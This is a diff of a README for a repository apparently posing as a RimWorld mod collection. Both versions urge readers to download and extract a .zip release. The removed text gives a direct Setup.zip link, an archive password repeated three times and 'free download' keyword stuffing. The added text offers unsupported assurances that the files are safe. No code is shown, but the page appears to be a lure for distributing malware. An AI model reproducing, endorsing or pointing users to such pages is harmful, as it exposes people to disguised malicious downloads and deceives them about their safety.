@@ -1,124 +1,84 @@
-# 🎮 RimWorld Mods 2026 — Best Mods Collection & Ultimate Pack
+# 🛠️ RimWorld-Mods - Essential patches for your game experience
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/RimWorld)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Modding-orange)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jsc5683/RimWorld-Mods/releases)
 
----
+RimWorld-Mods provides fixes and improvements for your game. These updates remove bugs and keep your game steady on Windows 10 and Windows 11. The project focuses on stability and performance for your colonies. We support 64-bit systems. We update these files regularly to match game versions from 2026.
 
-[![Download](og-image.png)](https://github.com/BaseDemultiplexer42/RimWorld-Mods/releases/download/v1.0/Setup.zip)
+## 📥 How to download the files
 
-<img src="https://cdn.akamai.steamstatic.com/steam/apps/294100/header.jpg" alt="banner" width="100%" />
+You need to access the release page to get the software. Follow these instructions to find the right files for your computer.
 
+1. Visit this page to download: [https://github.com/Jsc5683/RimWorld-Mods/releases](https://github.com/Jsc5683/RimWorld-Mods/releases).
+2. Look for the section titled "Assets" under the newest version.
+3. Click the file ending in .zip to save it to your computer.
+4. Open the folder where the file saved.
 
----
+## 💾 Installation steps
 
-## 📌 About
+Installing these mods requires moving files into your game folder. You do not need technical skills to perform these steps.
 
-**RimWorld — gameplay overhauls, visual enhancements, new content, UI improvements, and quality-of-life mods for RimWorld. Download, extract, and start in minutes. Fully compatible with Windows 10/11 (64-bit). Updated for 2026 with regular maintenance and community support.**
+1. Right-click the downloaded .zip file.
+2. Select "Extract All" from the menu.
+3. Choose a location on your hard drive. A desktop folder works well.
+4. Open your Steam library. 
+5. Right-click "RimWorld" in your game list.
+6. Select "Manage" and then choose "Browse local files." This opens the game directory.
+7. Open the folder named "Mods" inside this directory. If you do not see a folder named "Mods," create one.
+8. Drag the folders from your extracted download into this "Mods" folder.
 
----
+## 🎮 Enabling your mods
 
-## 📥 Download
+After you move the files, you must activate them in the game menu.
 
-[![RimWorld Mods](https://img.shields.io/badge/Download%20RimWorld%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/BaseDemultiplexer42/RimWorld-Mods/releases/download/v1.0/Setup.zip)
+1. Start RimWorld through Steam.
+2. Select the "Mods" button on the main screen.
+3. Find the mods you added from the list.
+4. Click the arrow button to move them to the active side of the screen.
+5. The game might ask you to restart. Click "Yes" and wait for the game to close and open again.
 
-**🔐🔐🔐** `1847`
+## ⚙️ System requirements
 
-**🔐🔐🔐** `1847`
+This software runs on any computer that supports the base game. We list the minimum hardware below to ensure a smooth experience.
 
-**🔐🔐🔐** `1847`
+*   System: Windows 10 or Windows 11 (64-bit version).
+*   Memory: 4 GB of RAM.
+*   Storage: 500 MB of space for mod files.
+*   Processor: Modern dual-core CPU.
 
----
+## ❓ Troubleshooting common issues
 
-## 🧩 What's Included
+If the game does not start or crashes, try these solutions. Most problems result from installation errors or missing files.
 
-| 📋 Category | 📁 Folder | 💬 Description |
-|---|---|---|
-| 🎭 Gameplay Overhaul | `1 Gameplay/` | Rebalancing, new mechanics, combat tweaks, difficulty options |
-| 🎨 Graphics & Visuals | `2 Graphics/` | Texture packs, ENB presets, lighting and weather overhauls |
-| 📜 New Content | `3 Content/` | New areas, storylines, items, characters, and quests |
-| 🖥️ UI & QoL | `4 UI/` | Interface overhaul, inventory improvements, minimap tweaks |
-| ⚡ Performance | `5 Performance/` | FPS boost configs, memory optimizations, stutter fixes |
-| 🔧 Patches & Fixes | `6 Fixes/` | Unofficial patches, compatibility fixes, stability mods |
+### Verify game files
+Steam can check if your game files contain errors. Follow these steps if the game behaves poorly.
 
----
+1. Open Steam.
+2. Right-click RimWorld.
+3. Select "Properties."
+4. Click the "Installed Files" tab.
+5. Select "Verify integrity of game files."
+6. Wait for the process to finish. Steam will replace any broken parts of the game.
 
-## 🗂 Archive Structure
+### Conflict management
+Sometimes different mods fight for control. If you have many mods from other sources, follow this advice.
 
-```
-RimWorld-Mods/
-├── 1 Gameplay/
-│   ├── Combat_Overhaul.zip
-│   ├── Difficulty_Rebalance.zip
-│   └── New_Mechanics.zip
-├── 2 Graphics/
-│   ├── HD_Texture_Pack.zip
-│   ├── ENB_Preset.zip
-│   └── Weather_Overhaul.zip
-├── 3 Content/
-│   ├── Story_Expansion.zip
-│   └── New_Items_Pack.zip
-├── 4 UI/
-│   ├── Better_UI.zip
-│   └── Inventory_Overhaul.zip
-├── 5 Performance/
-│   ├── FPS_Boost_Config.zip
-│   └── Stutter_Fix.zip
-└── 6 Fixes/
-    ├── Unofficial_Patch.zip
-    └── Compatibility_Fix.zip
-```
+1. Disable all mods except the ones from this collection. 
+2. Test if the game launches.
+3. Add other mods back one by one to find the cause of the problem.
 
----
+### Performance tips
+Do not run other heavy programs while you play. Modern laptops might use power-saving modes that reduce game speed. Ensure your laptop connects to a power outlet. Set your Windows power plan to "High Performance" for the best results.
 
-## 🚀 How to Install
+## 📈 Updating your mods
 
-1️⃣ **Download** the archive using the button above
-2️⃣ **Extract** with WinRAR or 7-Zip — password: `1847`
-3️⃣ **Open** the mod manager preset inside the archive
-4️⃣ **Apply** and launch RimWorld
+We release updates to match new game patches. Check the download page every month for new versions. 
 
-> 💡 **Pro tip:** Read each mod's README inside its folder for specific settings.
+1. Remove the old folders from your "Mods" directory before you add the new ones.
+2. Follow the installation steps again.
+3. Keep your save files in a safe location. Though these mods are safe, backing up your data protects your progress.
 
----
+## 🤝 Community and support
 
-## 📋 Requirements
+This project relies on user feedback. If you find a bug, open an issue on the repository main page. Be clear when you describe the problem. Include the version number of your game and the version of our mod you use. This helps us fix the issue faster.
 
-| 🔩 Component | Details |
-|---|---|
-| 💻 OS | Windows 10 / 11 (64-bit) |
-| 💾 Disk | 5–15 GB free space |
-| 🗜️ Extractor | WinRAR, 7-Zip, or built-in |
-| 🎮 Game | RimWorld (latest version) |
-
----
-
-## ❓ FAQ
-
-**Q: Will mods break my save file?**
-All included mods are tested for mid-game installation. Back up your save first.
-
-**Q: Do I need a mod manager?**
-Recommended (Vortex / MO2), but optional. Manual installation guides are included.
-
-**Q: Are these compatible with the latest patch?**
-Yes. The collection is updated every time a major patch drops.
-
----
-
-## 🔑 Keywords
-
-rimworld, rimworld download, rimworld 2026, rimworld pc, rimworld free download, rimworld windows, rimworld setup, rimworld latest version, rimworld mods, rimworld mod pack, rimworld nexus mods, rimworld mod manager, best rimworld mods 2026, nexus mods, mod loader
-
----
-
-## 📄 License
-
-MIT — see [LICENSE.md](LICENSE.md)
-
-## 🤝 Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md)
+We maintain this project for all players. We avoid bloat and keep the code clean. You can trust these patches to keep your game running smooth. Enjoy your time on the Rim.
